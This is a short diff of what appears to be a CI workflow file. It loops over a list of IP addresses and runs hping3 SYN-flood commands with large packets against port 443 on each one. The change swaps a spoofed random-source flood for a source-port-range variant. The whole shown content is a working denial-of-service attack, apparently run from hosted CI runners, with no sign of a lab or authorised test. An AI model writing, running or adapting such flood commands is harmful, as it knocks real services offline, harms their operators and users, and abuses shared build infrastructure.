@@ -95,8 +95,8 @@ jobs:
           for IP in "${IP_LIST[@]}"; do
             echo $IP
             echo "当前时间：$(date "+%Y-%m-%d %H:%M:%S")"
-            # sudo timeout 120s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 $IP || true
-            sudo timeout 120s hping3 -S --flood -V -d 65400 -p 443 --rand-source $IP || true
+            sudo timeout 120s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 $IP || true
+            # sudo timeout 120s hping3 -S --flood -V -d 65400 -p 443 --rand-source $IP || true
           done
           
           # for i in {1..4}; do
